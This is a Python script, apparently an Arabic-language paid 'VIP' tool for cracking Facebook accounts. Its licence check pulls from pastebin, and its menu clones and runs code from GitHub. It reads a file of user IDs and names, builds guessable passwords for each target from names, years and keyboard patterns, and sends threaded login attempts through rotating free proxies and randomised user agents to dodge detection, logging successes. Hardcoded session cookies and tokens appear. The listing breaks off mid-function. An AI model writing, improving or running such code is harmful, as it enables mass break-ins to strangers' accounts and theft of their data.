import requests,random
import requests,random,os,uuid,json,user_agent,time,sys,socket,datetime
from datetime import date
from time import sleep
from user_agent import generate_user_agent
from uuid import uuid4
from os import system
import os
import sys
import time
import requests
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from time import sleep
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import random
import os
import sys
import time
import os,sys,time,json,random,re,string,platform,base64
#mport requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import os
import webbrowser
import webbrowser
import requests,time,pyfiglet,datetime
import time,sys
def SDMID():
  uuid = str(os.geteuid())
  id = "".join(uuid)
  print("\x1b[37;1mكود  ID : "+id)
  try:
    httpCaht = requests.get("https://pastebin.com/raw/WSWi7c0Z").text
    if id in httpCaht:
      print('')
      print("\033[1;92m انت مشترڪ VIPاداة المبرمج نمࢪود...!")
      msg = str(os.geteuid())
      time.sleep(0.3)
      pass
    else:
      print('')
      print("\033[1;33m انت لست مشترڪ VIPللاشتراك ارسل كودك الى @M_T_F")
      
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
    
    SDMID()
SDMID()
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
a29 = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
a38 = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[38;5;117m'  # أزرق سماوي

SDMVIP="""
     
──────────────────────────────────────────────────────
─██████████████─████████████───██████──────────██████─
─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒████─██▒▒██████████████▒▒██─
─██▒▒██████████─██▒▒████▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─
─██▒▒██─────────██▒▒██──██▒▒██─██▒▒██████▒▒██████▒▒██─
─██▒▒██████████─██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██─
─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██─
─██████████▒▒██─██▒▒██──██▒▒██─██▒▒██──██████──██▒▒██─
─────────██▒▒██─██▒▒██──██▒▒██─██▒▒██──────────██▒▒██─
─██████████▒▒██─██▒▒████▒▒▒▒██─██▒▒██──────────██▒▒██─
─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒████─██▒▒██──────────██▒▒██─
─██████████████─████████████───██████──────────██████─
────────────────────────────────────────────────────── """

import os
import sys
import time
import requests
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.tree import Tree
from rich import print as cetak
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn
from rich.progress import SpinnerColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.panel import Panel as nel
import webbrowser
from rich import print as cetak
from rich.columns import Columns as col
from rich import print as prints
from rich import pretty
from rich.text import Text as tekz
import socket
import sys
import time
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
a10 = '\x1b[38;5;52m'  # بني
a11 = '\x1b[38;5;8m'  # رمادي
a12 = '\x1b[38;5;220m'  # ذهبي
a13 = '\x1b[38;5;7m'  # فضي
a14 = '\x1b[38;5;153m'  # أزرق فاتح
a15 = '\x1b[38;5;18m'  # أزرق داكن
a16 = '\x1b[38;5;48m'  # أخضر فاتح
a17 = '\x1b[38;5;22m'  # أخضر داكن
a18 = '\x1b[38;5;196m'  # أحمر فاتح
a19 = '\x1b[38;5;88m'  # أحمر داكن
a20 = '\x1b[38;5;226m'  # أصفر فاتح
a21 = '\x1b[38;5;136m'  # أصفر داكن
a22 = '\x1b[38;5;216m'  # برتقالي فات
a23 = '\x1b[38;5;166m'  # برتقالي داكن
a24 = '\x1b[38;5;234m'  # أرجواني فاتح
a25 = '\x1b[38;5;91m'  # أرجواني داكن
a26 = '\x1b[38;5;205m'  # وردي فاتح
a27 = '\x1b[38;5;161m'  # وردي داكن
a28 = '\x1b[38;5;236m'  # أسود فاتح
N = '\x1b[38;5;233m'  # أسود داكن
a30 = '\x1b[38;5;255m'  # أبيض فاتح
a31 = '\x1b[38;5;231m'  # أبيض داكن
a32 = '\x1b[38;5;180m'  # بني فاتح
a33 = '\x1b[38;5;94m'  # بني داكن
a34 = '\x1b[38;5;252m'  # رمادي فاتح
a35 = '\x1b[38;5;246m'  # رمادي داكن
a36 = '\x1b[38;5;228m'  # ذهبي فاتح
a37 = '\x1b[38;5;172m'  # ذهبي داكن
BM = '\x1b[38;5;188m'  # فضي فاتح
a39 = '\x1b[38;5;247m'  # فضي داكن
a40 = '\x1b[38;5;117m'  # أزرق سماوي

SDMVIP="""
     
──────────────────────────────────────────────────────
─██████████████─████████████───██████──────────██████─
─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒████─██▒▒██████████████▒▒██─
─██▒▒██████████─██▒▒████▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██─
─██▒▒██─────────██▒▒██──██▒▒██─██▒▒██████▒▒██████▒▒██─
─██▒▒██████████─██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██─
─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒██──██▒▒██─
─██████████▒▒██─██▒▒██──██▒▒██─██▒▒██──██████──██▒▒██─
─────────██▒▒██─██▒▒██──██▒▒██─██▒▒██──────────██▒▒██─
─██████████▒▒██─██▒▒████▒▒▒▒██─██▒▒██──────────██▒▒██─
─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒████─██▒▒██──────────██▒▒██─
─██████████████─████████████───██████──────────██████─
────────────────────────────────────────────────────── """
print(a11+a13+a27+SDMVIP)                                
print(f" {BM}القائمه{N}")
print(a11+' 𝗨𝐒𝐄𝐑 𝐌𝐄 ⋮ × @M_T_F  ')
print(a23+'▭▬'*25)
print('')
print(a12+'» 1- 𝐼𝐷𝐸𝐴𝑇 𝐶𝐻𝐸𝐶𝐾𝐕𝐈𝐏  ¦¦  ادات الفحص  ')
print(a12+'––'*25)
print('» 2- 𝐂𝐑𝐄𝐀𝐓𝐄 𝐀𝐍 𝐈𝐃𝐄 𝐅𝐈l𝐄  ¦¦  صنع ملف ايديات ')	
print(a12+'––'*25)	
print('» 0- 𝐓𝐑𝐈𝐌𝐈𝐗 𝐀𝐑𝐀𝐁𝐈𝐙𝐀𝐓𝐈𝐎𝐍    ¦¦ تعريب تريمكس   ')
print(a23+'▭▬'*25)
SDMVIPMOD=input(';')
if SDMVIPMOD=='1':from bs4 import BeautifulSoup as sop
elif SDMVIPMOD=='0':
	print('----')
	import os
	os.system('git clone https://github.com/br5kly/shh')
	os.chdir('shh')
	os.system('python arabic.py')
elif SDMVIPMOD=='2':
	import os
	os.system('git clone --https://raw.githubusercontent.com/baqer313/pack/check/app.ison')
	os.chdir('FILE')
	os.system('python app.ison')		

import requests,bs4,json,os,sys,random,datetime,time,re
import requests

lo = '''
'''
print(f'\033[1;31m{lo}')
Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
try:
 from cfonts import render, say
except:
 os.system('pip install python-cfonts')
output = render('SDM', colors=['white', 'red'], align='center')
print(output)
print('')
cookies = {
    'datr': 'iZ2xY04E3jAca46uaLOJLWbL',
    'sb': 'iZ2xYyI7oe2HAXvfOpqjNV2N',
    'locale': 'fa_IR',
    'vpd': 'v1%3B737x393x2.75',
    'wd': '393x737',
    'fr': '03qbkrBnVS1MbxzdF.AWWPF12j03FKAckquOtOJksxRdQ.BjsZ2J.Dd.AAA.0.0.BjtnKl.AWWZYuLXi94',
}

headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=iZ2xY04E3jAca46uaLOJLWbL; sb=iZ2xYyI7oe2HAXvfOpqjNV2N; locale=fa_IR; vpd=v1%3B737x393x2.75; wd=393x737; fr=03qbkrBnVS1MbxzdF.AWWPF12j03FKAckquOtOJksxRdQ.BjsZ2J.Dd.AAA.0.0.BjtnKl.AWWZYuLXi94',
    'origin': 'https://mbasic.facebook.com',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36',
}

params = {
    'refid': '8',
}

data = {
    'lsd': 'AVqAhQPrMiI',
    'jazoest': '2963',
    'uid': '100076526146833',
    'flow': 'login_no_pin',
    'next': '',
}

response = requests.post(
    'https://mbasic.facebook.com/login/device-based/validate-pin/',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()
#DATE AND TIME
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day

#USER-AGENTS
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
        prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
        open('.prox.txt','w').write(prox) 
except Exception as e:
        print(' \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;96mMERO')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
        a='Mozilla/5.0 (Symbian/3; Series60/'
        b=random.randrange(1, 9)
        c=random.randrange(1, 9)
        d='Nokia'
        e=random.randrange(100, 9999)
        f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
        g=random.randrange(1, 9)
        h=random.randrange(1, 4)
        i=random.randrange(1, 4)
        j=random.randrange(1, 4)
        k='Mobile Safari/535.1'
        uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
        ugen2.append(uaku)


        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12'])
        c=' en-us; GT-'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for x in range(10):
        a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
        b=random.randrange(100, 9999)
        c=random.randrange(100, 9999)
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        h=random.randrange(1, 9)
        i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
        j=random.randrange(1, 9)
        k=random.randrange(1, 9)
        l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
        uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
#PROXYGEN
def uaku():
        try:
                ua=open('bbnew.txt','r').read().splitlines()
                for ub in ua:
                        ugen.append(ub)
        except:
                a=requests.get('https://raw.githubusercontent.com/PSYCHO-PICCHI/ua/main/bbnew.txt').text
                ua=open('.bbnew.txt','w')
                aa=re.findall('line">(.*?)<',str(a))
                for un in aa:
                        ua.write(un+'\n')
                ua=open('.bbnew.txt','r').read().splitlines()

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#COLOR-CODE
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,O,h,u,b])

okc = 'X-FILE-OK-'+str(ta)+'.txt'
cpc = 'X-FILE-CP-'+str(ta)+'.txt'

def clear():
    os.system('clear')
    banner()
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "\x1b[1;91mPM"
else:
    a = ltx
    tag = "\x1b[1;96mAM"
#IPYTHONI
def _____MERO_____(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)
def tahun(fx):
        if len(fx)==15:
                if fx[:10] in ['1000000000']       :tahunz = '2009'
                elif fx[:9] in ['100000000']       :tahunz = '2009'
                elif fx[:8] in ['10000000']        :tahunz = '2009'
                elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
                elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
                elif fx[:6] in ['100001']          :tahunz = '2010-2011'
                elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
                elif fx[:6] in ['100004']          :tahunz = '2012-2013'
                elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
                elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
                elif fx[:6] in ['100009']          :tahunz = '2015'
                elif fx[:5] in ['10001']           :tahunz = '2015-2016'
                elif fx[:5] in ['10002']           :tahunz = '2016-2017'
                elif fx[:5] in ['10003']           :tahunz = '2018'
                elif fx[:5] in ['10004']           :tahunz = '2019'
                elif fx[:5] in ['10005']           :tahunz = '2020'
                elif fx[:5] in ['10006','10007','10008','10009','100010','100011','100012']:tahunz = '2021-2022'
                else:tahunz=''
        elif len(fx) in [9,10]:
                tahunz = '2008-2009'
        elif len(fx)==8:
                tahunz = '2007-2008'
        elif len(fx)==7:
                tahunz = '2006-2007'
        else:tahunz=''
        return tahunz
def clear():
        os.system('clear')
def back():
        login()
#LOGO
def banner():
        print('''
\033[2;35m❆\033[1;33m═══════════════\033[2;32m[ 𓆩ғᴀᴄᴇʙᴏᴏᴋ-ᴠɪᴘ𓆪 ]\033[1;33m════════════════\033[2;35m❆  
\x1b[38;5;209m 
  
  ██████╗██████╗░███╗░░░███╗
██╔════╝██╔══██╗████╗░████║
╚█████╗░██║░░██║██╔████╔██║
░╚═══██╗██║░░██║██║╚██╔╝██║
██████╔╝██████╔╝██║░╚═╝░██║
╚═════╝░╚═════╝░╚═╝░░░░░╚═╝    
 \033[2;35m❆\033[1;33m═══════════════\033[2;32m[𓆩المـبـࢪمج نـمࢪود 𝑆𝐷𝑀𓆪]\033[1;33m════════════════\033[2;35m❆
 \033[1;33m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[2;35m┓    
 \033[2;35m┃ \033[2;32mTelegram : \x1b[38;5;209m ☆𝑆𝐷𝑀☆ نـمࢪود | @M_T_F \033[2;35m┃
 \033[1;33m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[2;35m┛ 
 ''')
os.system('clear')
banner()
#MENU
def menu():
        _____MERO_____ ='1'
        if _____MERO_____ in ['1']:
                F()
                print(' \x1b[1;91m\x1b[1;96m{H} LogOut Successful ')
                exit()
        else:
                print(' \x1b[1;91m\x1b[1;96m\x1b[1;91m NOT SELECT ')
                back()
def error():
        print(f' \x1b[1;91m\x1b[1;96m{H} \x1b[1;91mBgarewa Bo Menu')
        time.sleep(2)
        back()
#INPUT-FILE
def F():
    os.system('clear');
    D().plerr()
    

class D:
        def __init__(self):
                self.id = []
        def plerr(self):
                os.system("clear")
                banner()
                try:

                        fileX = input ('FILE NAME : ')
                        for line in open(fileX, 'r').readlines():
                                id.append(line.strip())
                        print(f'\x1b[1;93mCOLECTED ID : \x1b[1;93m'+str(len(id)))
                        Settings()
                except IOError:
                        print(" \x1b[1;91m\x1b[1;96m{H} \x1b[1;91m file %s not found\x1b[0m"%(fileX));time.sleep(2)
                        F()
#SERVER-SETTING
def Settings():
        print('')
        print('\x1b[1;93mRANDOM IDS ')
        print('')
        hu = "1"
        if hu in ['2','02']:
                for tua in sorted(id):
                        id2.append(tua)

        elif hu in ['1','1']:
                muda=[]
                for bacot in sorted(id):
                        muda.append(bacot)
                bcm=len(muda)
                bcmi=(bcm-1)
                for xmud in range(bcm):
                        id2.append(muda[bcmi])
                        bcmi -=1
        elif hu in ['111','01']:
                for bacot in id:
                        xx = random.randint(0,len(id2))
                        id2.insert(xx,bacot)
        else:
                print('\x1b[1;91m\x1b[1;96m{H}\x1b[1;91mNOT HALBZHERA')
                exit()

        print('\x1b[1;93mMETHODE MOBILE')
        print('')
        hc = "1"
        if hc in ['1','01']:
                method.append('mobile')
        else:
                method.append('mobile')
        pwplus= "t"
        if pwplus in ['00','00']:
                pwpluss.append('ya')
                cetak(nel('[[cyan]•[white]] ENTER 6 CHARECTERS FOR CRACK PASS\n[[cyan]•[white]] LIKE --->[green] zaxo123,kurd123,hama1234[white] '))
                pwku=input('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mPassword > \x1b[1;93m')
                pwkuh=pwku.split(',')
                for xpw in pwkuh:
                        pwnya.append(xpw)
        else:
                pwpluss.append('no')
        BB()
        exit()
def BB():
    os.system('clear')
    banner()
    passwrd()
def passwrd():

    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(nmf)
                    pwv.append('frs+frs')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append('firstlast')
                    pwv.append('first123')
                    pwv.append('first1234567')
                    pwv.append(frs+"123123")
                    pwv.append('١٢٣٤٥٦')
                    pwv.append('١٢٣٤٥٦٧٨٩')
                    pwv.append('77889900')
                    pwv.append('00009999')
                    pwv.append('mmnnbbvv')
                    pwv.append('ppooiiuuyy')
                    pwv.append('zzxxccvv')
                    pwv.append('qqwweerr')
                    pwv.append('zxcvzxcv')
                    pwv.append('qwertyuiopasdfghjkl')
                    pwv.append('0099887766')
                    pwv.append('1020304050')
                    pwv.append('102030405060708090')
                    pwv.append('112233445566778899')
                    pwv.append('00998877665544332211')
                    pwv.append('1122334455@@')
                    pwv.append('20042004')
                    pwv.append('20032003')
                    pwv.append('20022002')
                    pwv.append('20202020')
                    pwv.append('20222022')
                    pwv.append('20232023')
                    pwv.append('19801980')
                    pwv.append('19901990')
                    pwv.append('19911991')
                    pwv.append('19921992')
                    pwv.append('19931993')
                    pwv.append('19941994')
                    pwv.append('19951995')
                    pwv.append('19961996')
                    pwv.append('19971997')
                    pwv.append('19981998')
                    pwv.append('19991999')
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    pwv.append('frs+frs')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append('firstlast')
                    pwv.append('first123')
                    pwv.append('first1234567')
                    pwv.append(frs+"123123")
                    pwv.append('١٢٣٤٥٦')
                    pwv.append('١٢٣٤٥٦٧٨٩')
                    pwv.append('77889900')
                    pwv.append('00009999')
                    pwv.append('mmnnbbvv')
                    pwv.append('ppooiiuuyy')
                    pwv.append('zzxxccvv')
                    pwv.append('qqwweerr')
                    pwv.append('zxcvzxcv')
                    pwv.append('qwertyuiopasdfghjkl')
                    pwv.append('0099887766')
                    pwv.append('1020304050')
                    pwv.append('102030405060708090')
                    pwv.append('112233445566778899')
                    pwv.append('00998877665544332211')
                    pwv.append('1122334455@@')
                    pwv.append('12345@@@@@')
                    pwv.append('1122334455@@@@@')
                    pwv.append('20042004')
                    pwv.append('20032003')
                    pwv.append('20022002')
                    pwv.append('20202020')
                    pwv.append('20212021')
                    pwv.append('20222022')
                    pwv.append('20232023')
                    pwv.append('19801980')
                    pwv.append('19901990')
                    pwv.append('19911991')
                    pwv.append('19921992')
                    pwv.append('19931993')
                    pwv.append('19941994')
                    pwv.append('19951995')
                    pwv.append('19961996')
                    pwv.append('19971997')
                    pwv.append('19981998')
                    pwv.append('19991999')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(cracktouch,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackmbasic,idf,pwv)
            else:
                pool.submit(crackmbasic,idf,pwv)
    print('')
 #   cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
    print(f'[{b}•{x}]{h} OK : {h}%s '%(ok))
    print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
def crack(idf,pwv):
        global loop,ok,cp
        sys.stdout.write(f"\r{x}[{H}𓆩𝐒𝐃𝐌-𝐕𝐈𝐏𓆪 ¦ᡕᠵ᠊ᡃ່࡚ࠢ࠘ ⸝່ࠡࠣ᠊߯᠆ࠣ࠘ᡁࠣ࠘᠊᠊ࠢ࠘~~ᡕᠵ᠊ᡃ່࡚ࠢ࠘ ⸝່ࠡࠣ᠊߯᠆ࠣ࠘ᡁࠣ࠘᠊᠊ࠢ࠘~~¦ 𝗣𝗬𝗧𝗛𝗢𝗡{x}]{loop}{U}|{H}{ok}"),
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua2 = random.choice(ugen2)
        ses = requests.Session()
        for pw in pwv:
                try:
                        nip=random.choice(prox)
                        proxs= {'http': 'socks4://'+nip}
                        ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                        p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
                        dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
                        koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                        koki+=' m_pixel_ratio=2.625; wd=412x756'
                        heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
                        po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
                        if "checkpoint" in po.cookies.get_dict().keys():
